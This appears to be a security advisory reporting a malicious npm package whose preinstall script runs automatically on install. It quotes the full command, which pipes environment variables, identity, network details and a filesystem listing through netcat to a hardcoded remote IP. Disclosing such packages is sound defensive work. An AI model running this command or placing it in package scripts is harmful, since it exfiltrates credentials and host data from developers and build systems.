summary: preinstall script exfiltrates environment, identity, and filesystem inventory to hardcoded remote IP
details: The package's package.json preinstall lifecycle script runs `(env; ip addr; id; find / -type f; sudo whoami) | nc 49.13.60.225 888`, which executes automatically on `npm install`. It streams the full process environment (including any CI/build credentials such as AWS, npm, and GitHub tokens), network interface configuration, user identity, a recursive listing of every file on the host, and sudo status over netcat to the hardcoded bare IP 49.13.60.225 on port 888. The destination is not associated with any registry, publisher, or documented service.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
